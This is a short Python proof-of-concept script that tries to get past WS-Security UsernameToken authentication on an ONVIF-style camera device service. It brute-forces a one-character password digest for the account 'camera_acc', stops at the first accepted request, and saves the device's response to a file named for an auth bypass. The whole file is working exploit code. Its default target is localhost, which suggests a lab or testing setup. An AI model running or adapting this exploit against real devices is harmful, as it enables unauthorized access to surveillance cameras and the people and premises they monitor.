import http.client, base64, datetime, os, string

HOST=os.environ.get("SSCPD_HOST", "127.0.0.1"); PORT=int(os.environ.get("SSCPD_PORT", "2020")); PATH="/sscp/device_service"
ALPHA=string.ascii_uppercase+string.ascii_lowercase+string.digits+"+/"

def build(username, nonce_b64, created, digest, op="GetStatus"):
    xml=f'''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
 <soap:Header><wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"><wsse:UsernameToken>
  <wsse:Username>{username}</wsse:Username>
  <wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest">{digest}</wsse:Password>
  <wsse:Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary">{nonce_b64}</wsse:Nonce>
  <wsu:Created xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">{created}</wsu:Created>
 </wsse:UsernameToken></wsse:Security></soap:Header>
 <soap:Body><tds:{op} xmlns:tds="http://www.onvif.org/ver10/device/wsdl"/></soap:Body>
</soap:Envelope>'''
    return xml.encode()

def post(xml):
    c=http.client.HTTPConnection(HOST,PORT,timeout=10)
    c.request("POST",PATH,body=xml,headers={"Content-Type":"application/soap+xml; charset=utf-8"})
    r=c.getresponse(); d=r.read(); hs=dict(r.getheaders()); c.close()
    return r.status,hs,d

created=datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
nonce=base64.b64encode(b"0123456789abcdef").decode()
print("created",created,"nonce",nonce)
hit=None
for ch in ALPHA:
    st,hs,d=post(build("camera_acc",nonce,created,ch))
    ok = st==200
    print(f"digest={ch!r} -> {st} len={len(d)} {'*** OK ***' if ok else ''}")
    if ok:
        hit=ch; break
print("HIT",hit)
if hit:
    open("sscp_auth_bypass.txt","w",encoding="utf-8").write(f"created={created} nonce={nonce} digest={hit}\n"+d.decode('utf-8','replace'))
    print(d.decode('utf-8','replace')[:1500])
